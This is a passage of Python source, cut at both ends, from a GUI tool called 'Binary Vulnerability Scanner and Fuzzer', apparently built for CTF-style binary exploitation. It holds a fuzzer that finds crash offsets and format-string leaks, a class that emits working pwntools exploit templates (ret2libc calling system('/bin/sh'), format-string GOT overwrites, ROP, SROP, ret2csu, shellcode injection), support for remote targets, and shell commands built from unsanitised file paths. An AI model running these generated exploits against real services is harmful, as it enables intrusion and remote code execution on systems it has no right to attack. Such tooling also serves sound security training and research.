                crash_info['subtype'] = 'format_string_write'
            else:
                crash_info['subtype'] = 'format_string_read'
        
        self.crashes.append(crash_info)
        return crash_info
    
    def _find_offset_from_crash(self, payload: str, result: Dict[str, Any]) -> int:
        if isinstance(payload, str) and len(payload) > 100:
            pattern = PatternGenerator.create(len(payload))
            pattern_result = self.runner.run(pattern)
            
            if pattern_result.get('crashed'):
                return len(payload) // 2
        
        return -1
    
    def _analyze_output_for_leaks(self, output: str, payload: str, context: str):
        pointer_pattern = r'(0x[0-9a-fA-F]{8,16})'
        pointers = re.findall(pointer_pattern, output)
        
        if pointers and '%' in str(payload):
            leak_info = {
                'context': context,
                'payload': payload[:100],
                'leaked_pointers': pointers[:5],
                'vulnerability_type': 'format_string',
                'confidence': 'high' if len(pointers) > 3 else 'medium'
            }
            
            if '%p' in str(payload):
                p_count = str(payload).count('%p')
                if p_count > 0:
                    leak_info['estimated_offset'] = 1
            
            self.leaks.append(leak_info)
            print(f"[+] Format string leak detected: {pointers[:3]}...")
        
        stack_pattern = r'(0x7f[0-9a-fA-F]{9,12})'
        heap_pattern = r'(0x55[0-9a-fA-F]{9,12}|0x56[0-9a-fA-F]{9,12})'
        
        stack_leaks = re.findall(stack_pattern, output)
        heap_leaks = re.findall(heap_pattern, output)
        
        if stack_leaks:
            leak_info = {
                'context': context,
                'payload': payload[:100],
                'leaked_addresses': stack_leaks[:3],
                'type': 'stack_leak',
                'confidence': 'high'
            }
            self.leaks.append(leak_info)
        
        if heap_leaks:
            leak_info = {
                'context': context,
                'payload': payload[:100],
                'leaked_addresses': heap_leaks[:3],
                'type': 'heap_leak',
                'confidence': 'medium'
            }
            self.leaks.append(leak_info)
    
    def _detect_leaks(self, output: str, payload: str, context: str) -> Optional[Dict[str, Any]]:
        leak_indicators = {
            'stack': ['0x7f', '0x7e', '0x7d'],
            'heap': ['0x55', '0x56', '0x57'],
            'libc': ['0x7f', '0x00007f'],
            'pie': ['0x55', '0x000055']
        }
        
        for leak_type, indicators in leak_indicators.items():
            for indicator in indicators:
                if indicator in output.lower():
                    return {
                        'type': f'{leak_type}_leak',
                        'context': context,
                        'payload': str(payload)[:50],
                        'indicator': indicator,
                        'output_snippet': output[:200]
                    }
        
        return None
    
    def _hash_crash(self, result: Dict[str, Any]) -> str:
        components = [
            str(result.get('returncode')),
            str(result.get('signal')),
            result.get('stdout', '')[:50],
            result.get('stderr', '')[:50]
        ]
        return hashlib.md5(''.join(components).encode()).hexdigest()
    
    def _calculate_offset(self, payload, result: Dict[str, Any]) -> Dict[str, Any]:
        offset_info = {
            'found': False,
            'offset': -1,
            'method': 'unknown'
        }
        
        if isinstance(payload, str) and any(pattern in payload for pattern in ['AAA', 'Aa0', 'Aa1']):
            if result.get('signal') == -11:
                offset_info['method'] = 'pattern_analysis'
                offset_info['offset'] = len(payload) // 2
                offset_info['confidence'] = 'low'
        
        return offset_info
    
    def calculate_format_string_offset(self, option: str) -> Dict[str, Any]:
        print(f"[*] Calculating format string offset for option: {option}")
        
        results = []
        
        for position in range(1, 21):
            payload = f"%{position}$p"
            result = self.runner.run_interactive([f"{option}\n", f"{payload}\n"])
            
            if result.get('success'):
                output = result.get('output', '')
                
                if '0x' in output and 'nil' not in output.lower():
                    match = re.search(r'(0x[0-9a-fA-F]{8,16})', output)
                    if match:
                        pointer = match.group(1)
                        results.append({
                            'position': position,
                            'pointer': pointer,
                            'controlled': True,
                            'note': 'You control this argument'
                        })
                    else:
                        results.append({
                            'position': position,
                            'pointer': 'unknown',
                            'controlled': False
                        })
                else:
                    results.append({
                        'position': position,
                        'pointer': None,
                        'controlled': False
                    })
        
        controlled_positions = [r for r in results if r.get('controlled')]
        
        return {
            'option': option,
            'tested_positions': 20,
            'controlled_positions': [r['position'] for r in controlled_positions],
            'detailed_results': results,
            'recommendation': f"Use positions {[r['position'] for r in controlled_positions[:3]]} for exploitation"
        }
    
    def calculate_buffer_offset(self, option: str) -> Dict[str, Any]:
        print(f"[*] Calculating buffer offset for option: {option}")
        
        test_sizes = [100, 200, 300, 400, 500]
        results = []
        
        for size in test_sizes:
            pattern = PatternGenerator.create(size)
            
            result = self.runner.run_interactive([f"{option}\n", f"{pattern}\n"])
            
            if result.get('crashed'):
                results.append({
                    'size': size,
                    'crashed': True,
                    'signal': result.get('signal'),
                    'estimated_offset': size - 8
                })
                
                exact_offset = self._binary_search_offset(option, size)
                if exact_offset != -1:
                    return {
                        'option': option,
                        'exact_offset': exact_offset,
                        'method': 'binary_search',
                        'confidence': 'high'
                    }
            else:
                results.append({
                    'size': size,
                    'crashed': False
                })
        
        return {
            'option': option,
            'results': results,
            'estimated_offset': self._estimate_from_results(results),
            'method': 'pattern_fuzzing',
            'confidence': 'medium'
        }
    
    def _binary_search_offset(self, option: str, crash_size: int) -> int:
        low = crash_size - 100
        high = crash_size
        last_crash = crash_size
        
        for _ in range(10):
            if high - low <= 1:
                return last_crash
            
            mid = (low + high) // 2
            pattern = PatternGenerator.create(mid)
            
            result = self.runner.run_interactive([f"{option}\n", f"{pattern}\n"])
            
            if result.get('crashed'):
                last_crash = mid
                high = mid
            else:
                low = mid
        
        return last_crash
    
    def _estimate_from_results(self, results: List[Dict]) -> int:
        crashes = [r for r in results if r.get('crashed')]
        if not crashes:
            return -1
        
        min_crash = min(crashes, key=lambda x: x['size'])
        return min_crash['size'] - 8
    
    def run_comprehensive_fuzzing(self, max_options: int = 5, tests_per_option: int = 300) -> Dict[str, Any]:
        print("[*] Starting comprehensive fuzzing...")
        
        discovery_results = self.discover_menu()
        
        fuzzing_results = []
        
        for option in discovery_results['discovered_options'][:max_options]:
            if self.stop_flag:
                break
                
            print(f"[*] Fuzzing option: {option}")
            result = self.fuzz_menu_option(option, "", tests_per_option)
            fuzzing_results.append(result)
            
            if result.get('crashes'):
                print(f"[*] Crashes found for option {option}, calculating offsets...")
                
                offset_result = self.calculate_buffer_offset(option)
                self.offsets[option] = offset_result
                
                if result.get('leaks'):
                    fmt_result = self.calculate_format_string_offset(option)
                    self.offsets[f"{option}_format"] = fmt_result
        
        return {
            'discovery': discovery_results,
            'fuzzing': fuzzing_results,
            'offsets': self.offsets,
            'total_crashes': sum(len(r.get('crashes', [])) for r in fuzzing_results),
            'total_leaks': sum(len(r.get('leaks', [])) for r in fuzzing_results)
        }
    
    def stop(self):
        self.stop_flag = True
        if self.runner.process:
            self.runner._kill_process()

class ExploitGenerator:
    @staticmethod
    def generate_buffer_overflow(offset: int, arch: str = 'x64', binary_path: str = './target') -> str:
        # Basic Ret2Win / Instruction Pointer Overwrite
        pack_fmt = 'p64' if arch == 'x64' else 'p32'
        
        return f'''#!/usr/bin/env python3
from pwn import *

# Set up binary
binary_path = '{binary_path}'
context.binary = binary = ELF(binary_path, checksec=False)

# Payload info
offset = {offset}
# target_addr = binary.symbols['win']  # If symbol exists
target_addr = 0xdeadbeef               # Manual address

log.info(f"Targeting offset {{offset}} with address {{hex(target_addr)}}")

# Construct Payload
payload  = b"A" * offset
payload += {pack_fmt}(target_addr)

# Send
# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)
p.interactive()
'''


    @staticmethod
    def generate_format_string(offset: int, binary_path: str = './target') -> str:
        # FmtStr Automation
        return f'''#!/usr/bin/env python3
from pwn import *

# Set up binary
binary_path = '{binary_path}'
context.binary = binary = ELF(binary_path, checksec=False)

# Connect
p = process()

# Automated FmtStr Attack
# Define function to send payload
def executefmt(payload):
    p = process()
    p.sendline(payload)
    return p.recvall()

# Auto-detect offset
# fmt = FmtStr(executefmt)
# offset = fmt.offset

# Manual exploit
offset = {offset}
writes = {{
    binary.got['puts']: binary.symbols['win']  # Example: Overwrite GOT
}}

payload = fmtstr_payload(offset, writes)

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)
p.interactive()
'''


    @staticmethod
    def generate_rop_chain(arch: str = 'x64', binary_path: str = './target') -> str:
        return f'''#!/usr/bin/env python3
from pwn import *

# Set up binary
binary_path = '{binary_path}'
context.binary = binary = ELF(binary_path, checksec=False)
rop = ROP(binary)

# Connect
p = process()

# Find Gadgets
try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
except:
    log.warning("Gadgets not found automatically")

offset = {'72' if arch == 'x64' else '44'}

# Build ROP Chain
# rop.raw(pop_rdi)
# rop.raw(binary.got['puts'])
# rop.call(binary.symbols['puts'])

print(rop.dump())

payload  = b"A" * offset
payload += rop.chain()

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def generate_ret2win(offset: int, win_addr: str, binary_path: str = './target') -> str:
        return f'''#!/usr/bin/env python3
from pwn import *

# Set up binary
binary_path = '{binary_path}'
context.binary = binary = ELF(binary_path, checksec=False)

# Connect
p = process()

# addresses
offset = {offset}
win_addr = {win_addr} 
# win_addr = binary.symbols['win'] # If symbol exists

log.info("Exploiting Ret2Win...")

payload  = b"A" * offset
payload += p64(win_addr)

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def generate_ret2libc(offset: int, system_addr: str, binsh_addr: str, pop_rdi: str, binary_path: str = './target') -> str:
        # Advanced Stage1/Stage2 Layout
        return f'''#!/usr/bin/env python3
from pwn import *

# Set up binary and libc
binary_path = '{binary_path}'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6' # Check your libc path

context.binary = binary = ELF(binary_path, checksec=False)
libc = ELF(libc_path, checksec=False)
rop = ROP(binary)

# Gadgets & Addresses
offset = {offset}
try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
except:
    pop_rdi = {pop_rdi} # Manual fallback
    ret = 0x40101a      # Manual fallback

got_puts = binary.got['puts']
plt_puts = binary.plt['puts']
main_func = binary.symbols['main'] # Return to main/start

p = process()
# p.recv() # if banner

# --- Stage 1: Leak Libc Name ---
log.info("Stage 1: Leaking libc address...")
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(got_puts) + p64(plt_puts)
payload += p64(main_func)

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)

# Receive Leak (Adjust recv logic as needed)
# p.recvuntil("Leaving!\\n") 
try:
    leaked_output = p.recvline().strip()
    leak = u64(leaked_output.ljust(8, b'\\x00'))
    log.success(f"puts leaked: {{hex(leak)}}")
    
    libc.address = leak - libc.symbols['puts']
    log.success(f"Libc Base: {{hex(libc.address)}}")
except Exception as e:
    log.error(f"Failed to leak: {{e}}")

# --- Stage 2: Ret2Libc Shell ---
log.info("Stage 2: Calling system('/bin/sh')...")

bin_sh = next(libc.search(b"/bin/sh\\x00"))
system_addr = libc.symbols['system']

payload  = b'B' * offset
payload += p64(ret) # Stack align if needed
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def generate_ret2plt(offset: int, pop_rdi: str, binary_path: str = './target') -> str:
        # Similar to Ret2Libc but focused on the PLT/GOT leak aspect
        return f'''#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF('{binary_path}', checksec=False)
rop = ROP(binary)

p = process()

offset = {offset}
pop_rdi = {pop_rdi}
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main     = binary.symbols['main']

log.info("Building Ret2PLT Chain...")

payload  = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b'\\x00'))
log.success(f"Leaked GOT entry: {{hex(leak)}}")

p.interactive()
'''

    @staticmethod
    def generate_srop(offset: int, syscall_addr: str, binary_path: str = './target') -> str:
        return f'''#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF('{binary_path}', checksec=False)

p = process()

offset = {offset}
syscall_ret = {syscall_addr} # gadget: syscall; ret

# Sigreturn Frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = 0xdeadbeef # Address of /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

log.info("Sending SROP Payload")

payload  = b"A" * offset
payload += p64(syscall_ret)
payload += bytes(frame)

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def generate_shellcode_injection(offset: int, arch: str = 'x64', binary_path: str = './target') -> str:
        # Based on user shellcraft example
        return f'''#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF('{binary_path}', checksec=False)

# 1. Generate Shellcode
# shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.cat('/flag.txt')) # Example

log.info(f"Shellcode length: {{len(shellcode)}}")

# 2. Construct Payload
offset = {offset}
# NOP Sled (optional)
# padding = asm('nop') * (offset - len(shellcode))

# Jump to Stack (jmp rsp / call rax / etc)
# jmp_rsp = next(binary.search(asm('jmp rsp')))
jmp_rsp = 0x4010ec # Replace with gadget address

payload  = b""
payload += shellcode
payload += b"\\x90" * (offset - len(shellcode)) # usage of NOPs for padding
payload += p64(jmp_rsp)

# 3. Send
p = process()
# p = remote('TARGET_IP', PORT)

p.recvuntil(b':> ') # Adjust prompt
p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def generate_ret2csu(offset: int, arch: str = 'x64', binary_path: str = './target') -> str:
        # Universal Gadget Template (x64)
        return f'''#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF('{binary_path}', checksec=False)
p = process()

offset = {offset}

# __libc_csu_init gadgets (Check via: objdump -d target)
# Gadget 1: POPs rbx, rbp, r12, r13, r14, r15; ret
csu_pop = 0x4006aa 

# Gadget 2: MOV rdx, r15; MOV rsi, r14; MOV edi, r13d; CALL [r12+rbx*8]
csu_mov = 0x400690 

# Target Function to Call (got entry)
target_func_ptr = binary.got['write'] 

# Args
arg1 = 1           # rdi (fd)
arg2 = binary.got['read'] # rsi (buf)
arg3 = 8           # rdx (len)

# Construct Chain
payload  = b"A" * offset

# 1. Setup registers via csu_pop
payload += p64(csu_pop)
payload += p64(0)   # rbx (0 to satisfy loop condition)
payload += p64(1)   # rbp (1 to satisfy loop condition)
payload += p64(target_func_ptr) # r12 (msg destination)
payload += p64(arg1) # r13 -> edi
payload += p64(arg2) # r14 -> rsi
payload += p64(arg3) # r15 -> rdx

# 2. Execution via csu_mov
payload += p64(csu_mov)

# 3. Clean up stack (7 * 8 bytes padding + ret)
payload += b"P" * 56 
payload += p64(binary.symbols['main'])

# p.recvuntil(b'> ') # Example: Wait for menu
p.sendline(payload)
p.interactive()
'''

    @staticmethod
    def generate_dynamic_exploit(history: List[Dict[str, Any]], final_payload: str = None, initial_output: str = "") -> str:
        script = [
            "#!/usr/bin/env python3",
            "from pwn import *",
            "",
            "# Set up binary",
            "binary_path = '{binary_path}'",
            "context.binary = binary = ELF(binary_path, checksec=False)",
            "",
            "# Connect",
            "p = process()",
            "",
            "log.info('Exploit started...')",
            ""
        ]
        
        script.append("# Replay History")
        
        # Helper to extract last meaningful line as prompt
        def get_prompt(text):
            if not text: return None
            lines = [l.strip() for l in text.split('\n') if l.strip()]
            if not lines: return None
            
            # Look for lines ending with : or > which are common prompt indicators
            for line in reversed(lines):
                if len(line) < 80 and (line.endswith(':') or line.endswith('>') or 'Enter' in line or 'input' in line.lower()):
                    return line.replace("'", "\\'")
            
            # Fallback to last line if reasonable length
            last = lines[-1]
            if len(last) < 80:
                return last.replace("'", "\\'")
            
            return None

        # 1. Initial banner/prompt - wait for binary to be ready
        if initial_output:
            prompt = get_prompt(initial_output)
            if prompt:
                script.append(f"p.recvuntil(b'{prompt}')")
                script.append("")

        # 2. Replay interaction steps
        for step in history:
            input_sent = step.get('input', '')
            output_received = step.get('output', '')
            
            # Send input
            if input_sent:
                script.append(f"p.sendline(b'{input_sent}')")
            
            # Wait for response/next prompt
            if output_received:
                prompt = get_prompt(output_received)
                if prompt:
                    script.append(f"p.recvuntil(b'{prompt}')")
        
        script.append("")
        script.append("# Final Payload")
        
        if final_payload:
            script.append(final_payload)
        else:
            script.append("# Insert your payload here")
            script.append("# p.sendline(payload)")
            
        script.append("")
        script.append("p.interactive()")
        
        return "\n".join(script)

class InteractiveSession:
    def __init__(self, binary_path=None, remote_ip=None, remote_port=None):
        self.binary_path = binary_path
        self.remote_ip = remote_ip
        self.remote_port = remote_port
        self.process = None
        self.pwn_process = None  # For pwntools remote
        self.running = False
        self.output_queue = __import__('queue').Queue()
        self.history = []
        self.initial_output = ""
        self.is_remote = bool(remote_ip and remote_port)

    def start(self):
        if self.running:
            return True
        
        if self.is_remote:
            return self.start_remote()
            
        try:
            self.process = subprocess.Popen(
                [self.binary_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0
            )
            self.running = True
            
            # Start reader threads
            threading.Thread(target=self._read_output, args=(self.process.stdout,), daemon=True).start()
            threading.Thread(target=self._read_output, args=(self.process.stderr,), daemon=True).start()
            
            return True
        except Exception as e:
            return False
    
    def start_remote(self):
        """Start remote connection using pwntools."""
        try:
            from pwn import remote
            self.pwn_process = remote(self.remote_ip, self.remote_port)
            self.running = True
            
            # Start reader thread for remote
            threading.Thread(target=self._read_pwn_output, daemon=True).start()
            
            return True
        except Exception as e:
            print(f"Remote connection failed: {e}")
            return False
    
    def _read_pwn_output(self):
        """Read output from pwntools remote connection."""
        while self.running:
            try:
                chunk = self.pwn_process.recv(4096, timeout=0.1)
                if chunk:
                    self.output_queue.put(chunk)
            except Exception:
                break


    def _read_output(self, pipe):
        # Use standard read for unbuffered streams (bufsize=0)
        while self.running and self.process.poll() is None:
            try:
                # Read available data (blocking until at least 1 byte or EOF)
                chunk = pipe.read(4096) 
                if not chunk:
                    # EOF reached
                    break
                
                self.output_queue.put(chunk)
            except Exception:
                break
        
        # Do NOT set self.running = False here to avoid race conditions

    def send(self, data):
        if not self.running:
            return False
        
        try:
            if isinstance(data, str):
                data = data.encode()
            
            # Send to remote or local
            if self.pwn_process:
                self.pwn_process.sendline(data)
            elif self.process:
                self.process.stdin.write(data + b'\n')
                self.process.stdin.flush()
            else:
                return False
            
            self.history.append({
                'input': data.decode(errors='ignore'),
                'timestamp': time.time(),
                'output': '' 
            })
            return True
        except:
            return False


    def get_output(self):
        output = b""
        while not self.output_queue.empty():
            output += self.output_queue.get()
        
        decoded = output.decode(errors='ignore')
        if decoded:
            if self.history:
                 # Associate output with last input if recent
                 self.history[-1]['output'] += decoded
            else:
                 # Store as initial output (banner etc)
                 self.initial_output += decoded
             
        return decoded

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=1)
            except:
                self.process.kill()
        if self.pwn_process:
            try:
                self.pwn_process.close()
            except:
                pass


if __name__ == "__main__":
    pass

class ROPGadgetFinder:
    """Finds ROP gadgets using ropper or objdump"""
    
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.gadgets = []
    
    def find_gadgets(self, max_results=100):
        """Find ROP gadgets - tries ropper first, falls back to objdump"""
        # Try ropper first
        ropper_gadgets = self._find_gadgets_ropper(max_results)
        if ropper_gadgets:
            return ropper_gadgets
        
        # Fallback to objdump
        return self._find_gadgets_objdump(max_results)
    
    def _find_gadgets_ropper(self, max_results=100):
        """Find gadgets using ropper tool - third party"""
        try:
            # Use ropper to find all gadgets - DIRECT output
            cmd = f"ropper --file {self.binary_path} --all 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            
            if result.returncode == 0 and result.stdout:
                gadgets = self._parse_ropper_output(result.stdout, max_results)
                if gadgets:
                    return gadgets
            
            # Fallback: basic ropper without --all
            cmd = f"ropper --file {self.binary_path} 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            
            if result.returncode == 0 and result.stdout:
                return self._parse_ropper_output(result.stdout, max_results)
        
        except Exception as e:
            pass
        
        return []
    
    def _parse_ropper_output(self, output, max_results=100):
        """Parse ropper output and extract gadgets - EXACT format matching"""
        gadgets = []
        
        # Remove ANSI color codes
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        output = ansi_escape.sub('', output)
        
        lines = output.strip().split('\n')
        
        for line in lines:
            if len(gadgets) >= max_results:
                break
            
            line = line.strip()
            if not line:
                continue
            
            # Skip headers and non-gadget lines
            if any(skip in line for skip in ['[*]', '[+]', '[-]', 'gadgets found', 'Gadgets', 'Address', '====']):
                continue
            
            # Match ropper format: "0x0000000000011a3:  instruction; instruction; ..."
            # Look for hex address at start followed by colon
            if re.match(r'^0x[0-9a-f]+:', line):
                try:
                    # Split on first colon
                    colon_pos = line.index(':')
                    addr_str = line[:colon_pos].strip()
                    instr_str = line[colon_pos+1:].strip()
                    
                    if addr_str and instr_str:
                        # Clean up address
                        addr = addr_str if addr_str.startswith('0x') else '0x' + addr_str
                        
                        gadgets.append({
                            'address': addr,
                            'instructions': instr_str,  # FULL instruction string - NO TRUNCATION
                            'source': 'ropper',
                            'arch': self._detect_arch(),
                            'offset': addr
                        })
                except Exception as e:
                    pass
        
        return gadgets
    
    def _find_gadgets_objdump(self, max_results=100):
        """Find gadgets using objdump as fallback"""
        gadgets = []
        
        try:
            # First try to get all disassembly
            cmd = f"objdump -d {self.binary_path} 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                
                for i, line in enumerate(lines):
                    if len(gadgets) >= max_results:
                        break
                    
                    line = line.strip()
                    if not line or line.startswith('Disassembly'):
                        continue
                    
                    # Look for instructions that end gadgets: ret, pop, jmp
                    if any(keyword in line.lower() for keyword in ['ret', 'pop', 'mov', 'add', 'sub', 'xor', 'lea']):
                        parts = line.split('\t')
                        if parts and ':' in parts[0]:
                            try:
                                addr_part = parts[0].split(':')[0].strip()
                                addr = '0x' + addr_part
                                
                                # Get the instruction
                                if len(parts) > 1:
                                    instr = parts[-1].strip()
                                    
                                    # Check if this looks like a valid gadget
                                    if instr and len(instr) > 0:
                                        gadgets.append({
                                            'address': addr,
                                            'instructions': instr,
                                            'source': 'objdump',
                                            'arch': self._detect_arch(),
                                            'offset': addr
                                        })
                            except:
                                pass
        
        except Exception as e:
            pass
        
        return gadgets[:max_results]
    
    def _detect_arch(self):
        """Detect architecture from binary"""
        try:
            result = subprocess.run(f"file {self.binary_path}", shell=True, capture_output=True, text=True)
            if 'x86-64' in result.stdout:
                return 'x64'
            elif 'Intel 80386' in result.stdout:
                return 'x86'
            elif 'ARM' in result.stdout:
                return 'ARM'
        except:
            pass
        
        return 'unknown'
    
    def find_libc_addresses(self):
        """Find system(), exit(), /bin/sh addresses"""
        try:
            result = subprocess.run(f"nm {self.binary_path} 2>/dev/null | grep -E 'system|exit'", 
                                  shell=True, capture_output=True, text=True)
            
            libc_addrs = {}
            for line in result.stdout.strip().split('\n'):
                if not line:
                    continue
                parts = line.split()
                if len(parts) >= 3:
                    addr, func = parts[0], parts[-1]
                    libc_addrs[func] = '0x' + addr
            
            return libc_addrs
        except:
            return {}

class BinaryVulnScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Binary Vulnerability Scanner and Fuzzer")
        self.root.geometry("1400x900")
        self.binary_path = ""
        self.current_results = None
        self.current_gadgets = []
        self.analyzer = None
        self.scanner = None
        self.fuzzer = None
        self.runner = None  # Fix: Initialize runner
        self.is_running = False
        self.editor_file_path = None
        self._create_gui()
        self._center_window()
        self._check_dependencies()
    
    def _check_dependencies(self):
        missing_required, missing_optional = DependencyChecker.check_required_tools()
        
        if missing_required:
            messagebox.showerror(
                "Missing Dependencies",
                f"Missing required tools: {', '.join(missing_required)}\n\n"
                "Please install: sudo apt-get install binutils file"
            )
            self.root.quit()
        
        if missing_optional:
            self.log(f"Optional tools not installed: {', '.join(missing_optional)}")
    
    def _create_gui(self):
        main_container = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, sashrelief=tk.RAISED)
        main_container.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        left_panel = tk.Frame(main_container, width=250, bg='#2c3e50')
        main_container.add(left_panel)
        
        right_panel = tk.Frame(main_container)
        main_container.add(right_panel)
        
        self._create_left_panel(left_panel)
        self._create_notebook(right_panel)
        self._create_status_bar()
    
    def _create_left_panel(self, parent):
        title_frame = tk.Frame(parent, bg='#34495e', height=60)
        title_frame.pack(fill=tk.X)
        title_frame.pack_propagate(False)
        
        title = tk.Label(
            title_frame,
            text="⚔️ Binary Vulnerability Scanner and Fuzzer",
            font=('Arial', 16, 'bold'),
            bg='#34495e',
            fg='white'
        )
        title.pack(expand=True)
        
        info_frame = tk.LabelFrame(parent, text="📁 Binary File", font=('Arial', 10), bg='#2c3e50', fg='white')
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.binary_label = tk.Label(
            info_frame,
            text="No file selected",
            wraplength=230,
            bg='#2c3e50',
            fg='#ecf0f1',
            font=('Arial', 9)
        )
        self.binary_label.pack(padx=10, pady=10)
        
        btn_frame = tk.Frame(parent, bg='#2c3e50')
        btn_frame.pack(fill=tk.X, padx=10, pady=10)
        
        buttons = [
            ("📁 Load Binary File", self.load_binary),
            ("🔍 Analyze Binary", self.analyze_binary),
            ("🛡️ Vulnerability Scan", self.scan_vulnerabilities),
            ("⚡ Interactive Analysis", self.interactive_analysis),
            ("📊 Offset Calculation", self.calculate_offset),
            ("💣 Generate Exploit", self.generate_exploit),
            ("📈 View Statistics", self.show_statistics),
            ("💾 Export Results", self.export_results),
            ("❌ Exit", self.root.quit)
        ]
        
        for text, command in buttons:
            btn = tk.Button(
                btn_frame,
                text=text,
                command=command,
                bg='#3498db',
                fg='white',
                font=('Arial', 10),
                width=25,
                anchor='w',
                padx=10
            )
            btn.pack(pady=3)
        
        status_frame = tk.LabelFrame(parent, text="📊 Current Status", font=('Arial', 10), bg='#2c3e50', fg='white')
        status_frame.pack(fill=tk.X, padx=10, pady=10, side=tk.BOTTOM)
        
        self.status_label = tk.Label(
            status_frame,
            text="Ready",
            bg='#2c3e50',
            fg='#2ecc71',
            font=('Arial', 9)
        )
        self.status_label.pack(padx=10, pady=5)
    
    def _create_notebook(self, parent):
        self.notebook = ttk.Notebook(parent)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        self._create_analysis_tab(self.notebook)
        self._create_vulnerabilities_tab(self.notebook)
        # self._create_fuzzing_tab(self.notebook) # Removed per user request (integrated into Interactive)
        self._create_interactive_tab(self.notebook)
        self._create_exploit_tab(self.notebook)
        self._create_gadgets_tab()
        self._create_code_editor_tab()
        self._create_log_tab()
    
    def _create_analysis_tab(self, notebook):
        frame = tk.Frame(self.notebook)
        self.notebook.add(frame, text="🔍 Analysis")
        
        toolbar = tk.Frame(frame)
        toolbar.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(
            toolbar,
            text="Re-analyze",
            command=self.analyze_binary,
            bg='#3498db',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            toolbar,
            text="Export Analysis",
            command=lambda: self.export_text(self.analysis_text),
            bg='#2ecc71',
            fg='white'
        ).pack(side=tk.LEFT, padx=5)
        
        self.analysis_text = scrolledtext.ScrolledText(
            frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#1e1e1e',
            fg='#d4d4d4'
        )
        self.analysis_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.analysis_text.config(state='disabled')
    
    def _create_vulnerabilities_tab(self, notebook):
        frame = tk.Frame(self.notebook)
        self.notebook.add(frame, text="🛡️ Vulnerabilities")
        
        paned = tk.PanedWindow(frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)
        
        left_frame = tk.Frame(paned)
        paned.add(left_frame, width=300)
        
        tk.Label(
            left_frame,
            text="Discovered Vulnerabilities",
            font=('Arial', 12, 'bold')
        ).pack(anchor='w', padx=10, pady=10)
        
        self.vuln_listbox = tk.Listbox(
            left_frame,
            font=('Consolas', 10),
            selectmode=tk.SINGLE
        )
        self.vuln_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.vuln_listbox.bind('<<ListboxSelect>>', self.on_vuln_select)
        
        right_frame = tk.Frame(paned)
        paned.add(right_frame)
        
        tk.Label(
            right_frame,
            text="Vulnerability Details",
            font=('Arial', 12, 'bold')
        ).pack(anchor='w', padx=10, pady=10)
        
        self.vuln_details = scrolledtext.ScrolledText(
            right_frame,
            wrap=tk.WORD,
            font=('Consolas', 10),
            bg='#1e1e1e',
            fg='#d4d4d4'
        )
        self.vuln_details.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.vuln_details.config(state='disabled')
    
    
    



    
    def _create_interactive_tab(self, notebook):
        # Interactive Analysis Tab
        frame = tk.Frame(self.notebook, bg='#2c3e50')
        self.notebook.add(frame, text="⚡ Interactive")
        
        control_frame = tk.Frame(frame, bg='#2c3e50')
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Connection type selection
        connection_frame = tk.Frame(control_frame, bg='#2c3e50')
        connection_frame.pack(side=tk.LEFT, padx=5)
        
        self.interactive_mode = tk.StringVar(value="local")
        tk.Radiobutton(connection_frame, text="Local Binary", variable=self.interactive_mode, value="local", bg='#2c3e50', fg='white', selectcolor='#34495e').pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(connection_frame, text="Remote Server", variable=self.interactive_mode, value="remote", bg='#2c3e50', fg='white', selectcolor='#34495e').pack(side=tk.LEFT, padx=5)
        
